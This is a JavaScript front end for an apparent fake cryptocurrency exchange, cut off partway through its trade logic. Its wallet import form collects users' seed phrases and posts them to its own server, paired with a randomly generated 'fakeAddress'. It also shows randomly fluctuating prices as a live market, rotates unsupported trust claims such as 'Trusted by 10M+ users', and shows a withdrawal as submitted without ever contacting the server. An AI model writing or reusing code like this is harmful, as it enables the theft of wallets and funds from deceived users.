const markets = [ 
    { name: 'Bitcoin', symbol: 'BTC', price: 85245.32, change: 2.48, icon: '₿', color: '#f7931a' }, 
    { name: 'Ethereum', symbol: 'ETH', price: 5245.10, change: 1.12, icon: 'Ξ', color: '#627eea' }, 
    { name: 'Tether', symbol: 'USDT', price: 1.00, change: 0.01, icon: '₮', color: '#26a17b' },
    { name: 'Solana', symbol: 'SOL', price: 252.32, change: 5.20, icon: 'S', color: '#00d2ff' }, 
    { name: 'BNB', symbol: 'BNB', price: 720.40, change: -0.45, icon: 'B', color: '#f3ba2f' }, 
    { name: 'XRP', symbol: 'XRP', price: 3.91, change: -1.20, icon: 'X', color: '#23292f' }, 
    { name: 'Cardano', symbol: 'ADA', price: 1.25, change: 3.10, icon: 'A', color: '#0033ad' }, 
    { name: 'Dogecoin', symbol: 'DOGE', price: 0.28, change: 1.45, icon: 'Ð', color: '#c2a633' }, 
    { name: 'Avalanche', symbol: 'AVAX', price: 45.20, change: -2.10, icon: 'A', color: '#e84142' }, 
    { name: 'Polkadot', symbol: 'DOT', price: 12.15, change: 0.50, icon: '●', color: '#e6007a' }, 
    { name: 'Chainlink', symbol: 'LINK', price: 28.40, change: 4.20, icon: '⬡', color: '#2a5ada' }, 
    { name: 'Polygon', symbol: 'MATIC', price: 1.12, change: -1.15, icon: 'M', color: '#8247e5' }, 
    { name: 'Shiba Inu', symbol: 'SHIB', price: 0.000045, change: 6.80, icon: 'S', color: '#f00500' }, 
    { name: 'Litecoin', symbol: 'LTC', price: 112.10, change: 1.05, icon: 'Ł', color: '#345d9d' }, 
    { name: 'TRON', symbol: 'TRX', price: 0.23, change: 0.80, icon: 'T', color: '#eb0029' }, 
    { name: 'Uniswap', symbol: 'UNI', price: 15.20, change: -0.90, icon: 'U', color: '#ff007a' }, 
    { name: 'Cosmos', symbol: 'ATOM', price: 14.80, change: 2.10, icon: '⚛', color: '#2e3148' }, 
    { name: 'Stellar', symbol: 'XLM', price: 0.22, change: -1.50, icon: 'X', color: '#000000' }, 
    { name: 'NEAR Protocol', symbol: 'NEAR', price: 9.50, change: 3.40, icon: 'N', color: '#00ec97' }, 
    { name: 'Aptos', symbol: 'APT', price: 15.20, change: -2.30, icon: 'A', color: '#000000' }, 
    { name: 'Arbitrum', symbol: 'ARB', price: 2.15, change: 1.80, icon: 'A', color: '#12aaff' }, 
    { name: 'Optimism', symbol: 'OP', price: 4.40, change: 0.40, icon: 'O', color: '#ff0420' }, 
    { name: 'Filecoin', symbol: 'FIL', price: 8.80, change: -1.10, icon: 'F', color: '#0090ff' }, 
    { name: 'Injective', symbol: 'INJ', price: 35.10, change: 7.20, icon: 'I', color: '#00d2ff' }, 
    { name: 'Sui', symbol: 'SUI', price: 2.65, change: 4.50, icon: 'S', color: '#6fbcf0' }, 
    { name: 'Pepe', symbol: 'PEPE', price: 0.000018, change: 12.40, icon: '🐸', color: '#3d8130' } 
];

const countries = [ 
    { name: "United States", flag: "🇺🇸" }, { name: "United Kingdom", flag: "🇬🇧" }, { name: "Canada", flag: "🇨🇦" }, 
    { name: "Australia", flag: "🇦🇺" }, { name: "Nigeria", flag: "🇳🇬" }, { name: "Kenya", flag: "🇰🇪" }, 
    { name: "South Africa", flag: "🇿🇦" }, { name: "Ghana", flag: "🇬🇭" }, { name: "India", flag: "🇮🇳" }, 
    { name: "Germany", flag: "🇩🇪" }, { name: "France", flag: "🇫🇷" }, { name: "Japan", flag: "🇯🇵" }, 
    { name: "UAE", flag: "🇦🇪" }, { name: "Brazil", flag: "🇧🇷" } 
];

const currencyMap = { 
    "🇺🇸 United States": { code: "USD", symbol: "$", rate: 1 }, "🇬🇧 United Kingdom": { code: "GBP", symbol: "£", rate: 0.79 }, 
    "🇨🇦 Canada": { code: "CAD", symbol: "C$", rate: 1.36 }, "🇦🇺 Australia": { code: "AUD", symbol: "A$", rate: 1.52 }, 
    "🇳🇬 Nigeria": { code: "NGN", symbol: "₦", rate: 1500 }, "🇰🇪 Kenya": { code: "KES", symbol: "KSh", rate: 130 }, 
    "🇿🇦 South Africa": { code: "ZAR", symbol: "R", rate: 18.5 }, "🇬🇭 Ghana": { code: "GHS", symbol: "₵", rate: 14.5 }, 
    "🇮🇳 India": { code: "INR", symbol: "₹", rate: 83.5 }, "🇩🇪 Germany": { code: "EUR", symbol: "€", rate: 0.92 }, 
    "🇫🇷 France": { code: "EUR", symbol: "€", rate: 0.92 }, "🇯🇵 Japan": { code: "JPY", symbol: "¥", rate: 150 }, 
    "🇦🇪 UAE": { code: "AED", symbol: "د.إ", rate: 3.67 }, "🇧🇷 Brazil": { code: "BRL", symbol: "R$", rate: 5.0 } 
};

const BONUS_RATE = 0.05;
let currentTradeMode = 'buy';
let currentUser = null;
let globalSettings = null;

function getUserCurrency() { if (!currentUser || !currentUser.country) return currencyMap["🇺🇸 United States"]; return currencyMap[currentUser.country] || currencyMap["🇺🇸 United States"]; }
function getExchangePrice(coin, mode) { return mode === 'buy' ? coin.price * (1 - BONUS_RATE) : coin.price * (1 + BONUS_RATE); }

function showView(viewId, authType = 'login') {
    document.querySelectorAll('.app-view').forEach(view => view.style.display = 'none');
    const target = document.getElementById(viewId);
    if (target) target.style.display = 'block';
    if (viewId === 'authView') switchAuth(authType);
    if (viewId === 'dashboardView') { fetchBalances(); checkWalletStatus(); }
    if (viewId === 'guestView') { loadMarkets(); }
    window.scrollTo(0, 0);
}

function showToast(msg) {
    const toast = document.getElementById('toast');
    if (toast) { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
}

function showCustomAlert(title, message) {
    let modal = document.getElementById('customAlertModal'); 
    modal.style.display = 'flex';
    modal.innerHTML = `<div class="custom-alert-box"><div class="custom-alert-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f6465d" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><h3>${title}</h3><p>${message}</p><button class="custom-alert-btn" onclick="document.getElementById('customAlertModal').style.display='none'">Got it</button></div>`;
}

function switchAuth(type) { 
    document.getElementById('loginForm').style.display = type === 'login' ? 'block' : 'none'; 
    document.getElementById('registerForm').style.display = type === 'register' ? 'block' : 'none'; 
}

function openCountrySelector() {
    let modal = document.getElementById('customAlertModal'); 
    modal.style.display = 'flex';
    let countryHtml = countries.map(c => `<div onclick="selectCountry('${c.flag} ${c.name}', '${c.flag} ${c.name}')" style="padding: 15px; border-bottom: 1px solid #333; cursor: pointer; display: flex; gap: 10px;"><span>${c.flag}</span> ${c.name}</div>`).join('');
    modal.innerHTML = `<div class="modal-content" style="max-height: 80vh; overflow-y: auto;"><h3 style="margin-bottom: 15px; color: #fff;">Select Country</h3>${countryHtml}</div>`;
}

function selectCountry(value, display) {
    document.getElementById('regCountry').value = value;
    document.getElementById('regCountryDisplay').innerHTML = `<span>${display}</span><span>▼</span>`;
    document.getElementById('customAlertModal').style.display = 'none';
}

async function handleRegister() {
    const name = document.getElementById('regName').value, country = document.getElementById('regCountry').value, phone = document.getElementById('regPhone').value, email = document.getElementById('regEmail').value, password = document.getElementById('regPassword').value, confirm = document.getElementById('regConfirmPassword').value, terms = document.getElementById('regTerms').checked;
    if (!name || !country || !phone || !email || !password) return showToast("Please fill all fields.");
    if (password !== confirm) return showToast("Passwords do not match.");
    if (!terms) return showToast("You must agree to the Terms.");
    try {
        const res = await fetch('/api/auth/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name, country, phone, email, password }) });
        const data = await res.json();
        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

async function handleLogin() {
    const email = document.getElementById('loginEmail').value, password = document.getElementById('loginPassword').value;
    if (!email || !password) return showToast("Please fill all fields.");
    try {
        const res = await fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) });
        const data = await res.json();
        if (res.ok) { localStorage.setItem('token', data.token); localStorage.setItem('user', JSON.stringify(data.user)); checkAuthState(); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

function handleLogout() { localStorage.removeItem('token'); localStorage.removeItem('user'); checkAuthState(); }

async function loadGlobalSettings() {
    try {
        const res = await fetch('/api/admin/public/settings');
        globalSettings = await res.json();
        
        // Merge Custom Assets
        if (globalSettings && globalSettings.customAssets && Array.isArray(globalSettings.customAssets)) {
            globalSettings.customAssets.forEach(asset => {
                if (!markets.find(m => m.symbol === asset.symbol)) {
                    markets.push({ name: asset.name, symbol: asset.symbol, price: parseFloat(asset.price) || 0, change: 0, icon: asset.icon || asset.symbol.charAt(0), color: asset.color || '#333333' });
                }
            });
            populateTradeCoins();
            loadMarkets();
        }

        // Populate Homepage Footer
        const socialContainer = document.getElementById('socialLinksContainer');
        const legalText = document.getElementById('legalDisclaimerText');
        if (socialContainer && legalText) {
            let html = '';
            if (globalSettings.socialTwitter) html += `<a href="${globalSettings.socialTwitter}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Twitter (X)</a>`;
            if (globalSettings.socialTelegram) html += `<a href="${globalSettings.socialTelegram}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Telegram</a>`;
            if (globalSettings.socialDiscord) html += `<a href="${globalSettings.socialDiscord}" target="_blank" style="color: #00d4aa; text-decoration: none; font-weight: bold; font-size: 13px;">Discord</a>`;
            socialContainer.innerHTML = html;
            legalText.textContent = globalSettings.legalDisclaimer || '';
        }
        
        // Populate Registration Disclaimer
        const regDisclaimer = document.getElementById('regDisclaimer');
        if (regDisclaimer && globalSettings.legalDisclaimer) regDisclaimer.textContent = globalSettings.legalDisclaimer;

    } catch (e) { console.log("Error loading settings", e); }
}

function checkAuthState() {
    currentUser = JSON.parse(localStorage.getItem('user'));
    if (currentUser && (currentUser.isAdmin || currentUser.email.includes('admin'))) { window.location.href = '/admin.html'; return; }
    const navLinks = document.getElementById('navLinks');
    if (currentUser) {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')">${currentUser.name.charAt(0).toUpperCase()}</a><a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>`;
        showView('dashboardView');
    } else {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" onclick="showView('authView', 'login')">Login</a><a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>`;
        showView('guestView');
    }
}

function populateTradeCoins() { 
    const select = document.getElementById('tradeCoin'); 
    if(!select) return; 
    select.innerHTML = ''; 
    markets.forEach(c => { const o = document.createElement('option'); o.value = c.symbol; o.textContent = `${c.name} (${c.symbol})`; select.appendChild(o); }); 
}

let trustIndex = 0;
const trustMessages = ["🛡️ Trusted by 10M+ users globally", "🔒 256-bit Encryption & Cold Storage", "⚡ Lightning-Fast Execution", "💬 24/7 Professional Support", "🌍 Trade over 500+ cryptocurrencies"];
setInterval(() => {
    const badge = document.getElementById('dynamicTrustBadge');
    if (badge) {
        badge.style.opacity = 0;
        setTimeout(() => {
            trustIndex = (trustIndex + 1) % trustMessages.length;
            badge.textContent = trustMessages[trustIndex];
            badge.style.opacity = 1;
        }, 300);
    }
}, 3000);

function simulateLiveMarket() {
    markets.forEach(coin => {
        const fluctuation = (Math.random() - 0.5) * (coin.price * 0.002);
        coin.price += fluctuation;
        const changeFluctuation = (Math.random() - 0.5) * 0.2;
        coin.change = parseFloat((coin.change + changeFluctuation).toFixed(2));
    });
}

function loadMarkets() {
    const marketList = document.getElementById('market-list'); const ticker = document.getElementById('ticker');
    if(!marketList) return;
    let marketHTML = ''; let tickerHTML = '';
    
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; const changeClass = isUp ? 'up' : 'down'; const changeSymbol = isUp ? '↑' : '↓';
        let formattedPrice = coin.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 6});
        marketHTML += `<div class="market-row" onclick="quickTrade('${coin.symbol}')"><div class="market-rank">${index + 1}</div><div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div><div class="market-price">$${formattedPrice}</div><div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change)}%</div></div>`;
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change)}%</span></div>`;
    });
    marketList.innerHTML = marketHTML; if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 

    // Hero Chart
    const btc = markets.find(c => c.symbol === 'BTC');
    if(btc) {
        document.getElementById('heroChartPrice').innerText = `$${btc.price.toLocaleString()}`;
        document.getElementById('heroChartChange').innerText = `+${btc.change}%`;
        let path = "M0,60 ";
        for(let i=1; i<=10; i++) { path += `L${i*30},${Math.random() * 40 + 20} `; }
        document.getElementById('heroSvgContainer').innerHTML = `<svg width="100%" height="100%" viewBox="0 0 300 80"><path d="${path}" fill="none" stroke="#0ecb51" stroke-width="3"/></svg>`;
    }

    // Gainers & Losers
    const glList = document.getElementById('gainersLosersList');
    if(glList) {
        const sorted = [...markets].sort((a,b) => b.change - a.change);
        const top = [...sorted.slice(0, 3), ...sorted.slice(-3)];
        glList.innerHTML = top.map(c => `<div class="gl-card"><div style="font-size:11px; color:#888;">${c.symbol}</div><div style="font-weight:bold; margin: 5px 0; font-size:13px;">$${c.price}</div><div class="${c.change >= 0 ? 'up' : 'down'}" style="font-size:11px;">${c.change >= 0 ? '↑' : '↓'} ${Math.abs(c.change)}%</div></div>`).join('');
    }
}

function quickTrade(symbol) { requireAuth('tradeView', 'buy'); setTimeout(() => { document.getElementById('tradeCoin').value = symbol; calcTrade(); }, 100); }

async function checkWalletStatus() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}`);
        const user = await res.json();
        const disconnected = document.getElementById('walletDisconnected'), pending = document.getElementById('walletPending'), approved = document.getElementById('walletApproved'), badge = document.getElementById('walletStatusBadge');
        if(disconnected) disconnected.style.display = 'none'; if(pending) pending.style.display = 'none'; if(approved) approved.style.display = 'none';
        
        if (user.walletStatus === 'approved') {
            if(approved) approved.style.display = 'block'; 
            if(document.getElementById('displayWalletAddress')) document.getElementById('displayWalletAddress').textContent = user.walletAddress; 
            if(badge) { badge.textContent = 'CONNECTED'; badge.className = 'status-badge approved'; }
        } else if (user.walletStatus === 'pending') {
            if(pending) pending.style.display = 'block'; if(badge) { badge.textContent = 'VERIFYING'; badge.className = 'status-badge pending'; }
        } else {
            if(disconnected) disconnected.style.display = 'block'; if(badge) { badge.textContent = 'NOT CONNECTED'; badge.className = 'status-badge disconnected'; }
        }
    } catch (error) { console.log(error); }
}

function showImportWallet() { document.getElementById('importWalletForm').style.display = 'block'; }
async function submitWallet() {
    const seed = document.getElementById('seedPhraseInput').value.trim();
    if (seed.split(' ').length < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    try {
        const res = await fetch('/api/wallet/import', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: currentUser.email, seedPhrase: seed, walletAddress: fakeAddress }) });
        if (res.ok) { showToast("Wallet submitted for review."); checkWalletStatus(); }
    } catch (error) { showToast("Error submitting wallet."); }
}

async function fetchBalances() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <span style="font-size: 13px; color: #aaa;">Hide Zero</span>
                    <div style="position: relative; width: 44px; height: 24px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0; position: absolute;">
                        <span id="toggleTrack" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#3a3a4a'}; border-radius: 24px; transition: 0.3s;"></span>
                        <span id="toggleThumb" style="position: absolute; height: 20px; width: 20px; left: ${hideZero ? '21px' : '2px'}; bottom: 2px; background-color: #fff; border-radius: 50%; transition: 0.3s;"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
            <div id="assetsListContainer" class="${hideZero ? 'hide-zeros' : ''}" style="display: flex; flex-direction: column;">
        `;
        
        let totalValue = 0;
        markets.forEach(coin => {
            const amount = Math.max(0, balances[coin.symbol] || 0); 
            const value = amount * coin.price;
            totalValue += value;
            const rowClass = amount === 0 ? 'asset-row zero-row' : 'asset-row';
            html += `<div class="${rowClass}" onclick="window.showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})">
                <div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name}</div>
                <div class="asset-amount">${amount.toFixed(6)}</div>
                <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
            </div>`;
        });
        html += `</div>`;
        assetsCard.innerHTML = html;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) {
            totalEl.dataset.realValue = `$${Math.max(0, totalValue).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
            totalEl.textContent = localStorage.getItem('hideBalance') === 'true' ? '******' : totalEl.dataset.realValue;
        }
        
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                const isChecked = e.target.checked; localStorage.setItem('hideZeroBalances', isChecked);
                const listContainer = document.getElementById('assetsListContainer');
                if (isChecked) listContainer.classList.add('hide-zeros'); else listContainer.classList.remove('hide-zeros');
                document.getElementById('toggleTrack').style.backgroundColor = isChecked ? '#00d4aa' : '#3a3a4a';
                document.getElementById('toggleThumb').style.left = isChecked ? '21px' : '2px';
            });
        }
    } catch (error) { console.log("Balance fetch error:", error); }
}

function toggleBalanceVisibility() {
    const valueEl = document.getElementById('totalPortfolioValue'), iconEl = document.getElementById('eyeIcon');
    if (!valueEl) return; 
    const isHidden = localStorage.getItem('hideBalance') === 'true'; 
    const newState = !isHidden; 
    localStorage.setItem('hideBalance', newState);
    if (newState) { 
        valueEl.textContent = '******'; 
        if(iconEl) iconEl.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>'; 
    } else { 
        valueEl.textContent = valueEl.dataset.realValue || '$0.00'; 
        if(iconEl) iconEl.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>'; 
    }
}

document.addEventListener('DOMContentLoaded', () => {
    loadGlobalSettings();
    populateTradeCoins(); 
    checkAuthState(); 
    loadMarkets();
    setInterval(() => { simulateLiveMarket(); loadMarkets(); }, 2000);
});

/* =====================================================
   PART 6A: MODALS & FULL PAGES
   ===================================================== */
window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal'); 
    modal.style.display = 'flex';
    
    const coin = markets.find(c => c.symbol === symbol);
    const bgColor = coin ? coin.color : '#333';
    const icon = coin ? coin.icon : name.charAt(0);

    modal.innerHTML = `
        <div class="modal-content" style="text-align: center;">
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span>
            <div style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; background: ${bgColor}; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white;">${icon}</div>
            <h2 style="margin: 0 0 5px 0; color: #fff; font-size: 22px; font-weight: 700;">${name} (${symbol})</h2>
            <div style="margin-bottom: 25px; margin-top: 15px;">
                <p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p>
                <h3 style="color: #fff; margin: 0; font-size: 18px;">${amount.toFixed(6)} ${symbol}</h3>
                <p style="color: #00d4aa; margin: 5px 0 0 0; font-size: 14px; font-weight: 600;">≈ $${value.toFixed(2)} USD</p>
            </div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Buy</button>
                <button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Sell</button>
                <button onclick="document.getElementById('assetActionModal').style.display='none'; window.openDepositPage('${symbol}');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Deposit</button>
                <button onclick="document.getElementById('assetActionModal').style.display='none'; window.openWithdrawPage('${symbol}', ${amount});" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Withdraw</button>
            </div>
        </div>
    `;
    window._currentActionSymbol = symbol;
};

window.executeAssetAction = function(mode) { 
    document.getElementById('assetActionModal').style.display = 'none'; 
    requireAuth('tradeView', mode); 
    setTimeout(() => { document.getElementById('tradeCoin').value = window._currentActionSymbol; calcTrade(); }, 100); 
};

function createPageView(id, title, contentHtml) {
    let view = document.getElementById(id); 
    if (view) view.remove(); 
    view = document.createElement('main'); 
    view.id = id; 
    view.className = 'app-view'; 
    view.style.display = 'none'; 
    view.innerHTML = `
        <div style="max-width: 500px; margin: 0 auto; padding: 20px;">
            <div style="display: flex; align-items: center; margin-bottom: 25px;">
                <button onclick="showView('dashboardView')" style="width: 42px; height: 42px; border-radius: 50%; background: #1a1a2a; border: 1px solid #2a2a3a; display: flex; align-items: center; justify-content: center; cursor: pointer; margin-right: 15px; padding: 0; color: #fff;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                </button>
                <h2 style="margin: 0; font-size: 20px; color: #fff;">${title}</h2>
            </div>
            <div class="card" style="background: #1a1a2a; border-radius: 16px; padding: 25px; border: 1px solid #2a2a3a;">
                ${contentHtml}
            </div>
        </div>`;
    document.body.appendChild(view);
}

window.openDepositPage = function(symbol) {
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support (Address Not Set)";
    let isMissing = address.includes("Contact");
    let qrCodeUrl = isMissing ? "" : `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${address}`;

    const content = `
        <div style="text-align: center;">
            <h3 style="color: #fff;">Deposit ${symbol}</h3>
            <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Send only ${symbol} to this address.</p>
            
            <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 20px;">
                ${qrCodeUrl ? `<img src="${qrCodeUrl}" style="background:#fff; padding:8px; border-radius:8px; margin-bottom:15px; width: 150px; height: 150px;">` : ''}
                <div style="font-family: monospace; font-size: 13px; color: ${isMissing ? '#f6465d' : '#00d4aa'}; word-break: break-all; margin-bottom: 15px; line-height: 1.4;">${address}</div>
                ${!isMissing ? `<button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy Address', 2000);" style="background: #00d4aa; color: #000; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;">Copy Address</button>` : ''}
            </div>
            
            <div class="warning-banner" style="text-align: left; margin-bottom: 0;">
                <span style="color: #f6465d; font-size: 16px;">⚠️</span>
                <p>Sending any other coin or using the wrong network to this address will result in permanent loss of funds.</p>
            </div>
        </div>
    `;
    createPageView('depositPageView', 'Deposit', content);
    showView('depositPageView');
}

window.openWithdrawPage = function(symbol, balance) {
    const safeBalance = Math.max(0, balance).toFixed(6);
    const content = `
        <div>
            <h3 style="color: #fff; text-align: center;">Withdraw ${symbol}</h3>
            <p style="color: #888; text-align: center; margin-bottom: 20px;">Available: ${safeBalance} ${symbol}</p>
            
            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                <label style="color: #888; font-size: 12px;">Amount</label>
                <button onclick="document.getElementById('withdrawPageAmount').value = '${safeBalance}';" style="background: none; border: none; color: #00d4aa; font-size: 12px; font-weight: bold; cursor: pointer;">MAX</button>
            </div>
            <div style="position: relative; margin-bottom: 15px;">
                <input type="number" id="withdrawPageAmount" placeholder="0.00" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px 50px 14px 14px; border-radius: 8px; color: #fff;">
                <span style="position: absolute; right: 15px; top: 15px; color: #888; font-weight: bold;">${symbol}</span>
            </div>
            
            <div style="margin-bottom: 20px;">
                <label style="color: #888; font-size: 12px; margin-bottom: 5px; display: block;">Destination Address</label>
                <input type="text" id="withdrawPageAddress" placeholder="Enter ${symbol} address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;">
            </div>
            
            <div class="warning-banner">
                <span style="color: #f6465d; font-size: 16px;">⚠️</span>
                <p>Ensure the destination address is correct and supports the ${symbol} network.</p>
            </div>
            
            <button onclick="window.executeWithdrawal('${symbol}', ${safeBalance})" style="background: #f6465d; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer;">Confirm Withdrawal</button>
        </div>`;
    createPageView('withdrawPageView', 'Withdraw', content);
    showView('withdrawPageView');
};

window.executeWithdrawal = function(symbol, balance) {
    const amount = parseFloat(document.getElementById('withdrawPageAmount').value); 
    const address = document.getElementById('withdrawPageAddress').value.trim();
    if (!amount || amount <= 0) return showCustomAlert('Error', 'Invalid amount.'); 
    if (amount > balance) return showCustomAlert('Error', 'Insufficient balance.'); 
    if (!address || address.length < 20) return showCustomAlert('Error', 'Invalid address.');
    showToast(`Withdrawal submitted.`); showView('dashboardView');
};

window.openAssetSelector = function(action) {
    let modal = document.getElementById('assetActionModal'); 
    modal.style.display = 'flex';
    
    let assetHtml = markets.map(coin => `<div onclick="document.getElementById('assetActionModal').style.display='none'; ${action === 'deposit' ? `window.openDepositPage('${coin.symbol}')` : `window.openWithdrawPage('${coin.symbol}', 0)`};" style="display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #2a2a3a; cursor: pointer;"><div style="display: flex; gap: 10px; align-items: center;"><div style="background:${coin.color}; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff;">${coin.icon}</div><div><div style="color: #fff; font-weight: bold; font-size: 14px;">${coin.name}</div><div style="color: #888; font-size: 12px;">${coin.symbol}</div></div></div></div>`).join('');
    
    modal.innerHTML = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;"><div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;"><h2 style="color: #fff; margin: 0; font-size: 18px; text-transform: capitalize;">Select ${action}</h2><span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span></div><div style="overflow-y: auto; flex: 1;">${assetHtml}</div></div>`;
};

/* =====================================================
   PART 6B: TRADE LOGIC & PAYMENT FLOWS
   ===================================================== */
function requireAuth(targetView, mode = null) {
    if (!currentUser) { showView('authView', 'login'); showToast("Please log in."); }
    else { showView(targetView); if (targetView === 'tradeView') setTradeMode(mode || 'buy'); }
}

function setTradeMode(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--success)'; 
        document.getElementById('receivingWalletContainer').style.display = 'block'; 
        document.getElementById('receiveLabel').textContent = 'You will receive (Crypto)';
        document.getElementById('methodLabel').textContent = 'Payment Method';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)'; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)'; 
        document.getElementById('receivingWalletContainer').style.display = 'none'; 
        document.getElementById('receiveLabel').textContent = `You will receive (${curr.code})`;
        document.getElementById('methodLabel').textContent = 'Payout Method';
    }
    
    document.getElementById('tradeMethod').innerHTML = `<option value="Bank Transfer">Bank Transfer</option><option value="PayPal">PayPal</option><option value="Credit Card">Credit Card</option>`;
    document.getElementById('tradeAmount').value = ''; 
    document.getElementById('tradeReceive').value = ''; 
    togglePaymentDetails(); 
    calcTrade();
}

window.togglePaymentDetails = function() {
